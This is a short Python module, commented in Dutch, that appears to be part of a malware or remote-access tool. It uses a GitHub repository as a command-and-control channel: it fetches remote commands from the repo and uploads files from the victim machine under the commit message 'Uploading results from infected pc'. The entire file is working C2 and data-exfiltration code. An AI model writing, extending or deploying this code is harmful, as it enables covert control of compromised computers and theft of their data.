# Commandos uit github repo halen
# Packages importeren
from .filemanager import readFile
from dotenv import load_dotenv
from datetime import datetime
from github import Github
import os

# ENV variabelen opehalen
load_dotenv()
GITHUB_TOKEN = os.getenv("TOKEN_GITHUB")
g = Github(GITHUB_TOKEN)
repo = g.get_user().get_repo("pythonproject")


def readRemoteCommands(file):
    result_file = repo.get_contents(file)
    return result_file.decoded_content


def writeToRepo(file, hostname):
    content = readFile(file)
    time = datetime.now()

    pad = f"result/{hostname}-{time}.txt"
    repo.create_file(
        pad,
        f"Uploading results from infected pc: {hostname}",
        content,
        branch="main",
    )
    print(f"{pad} aangemaakt")
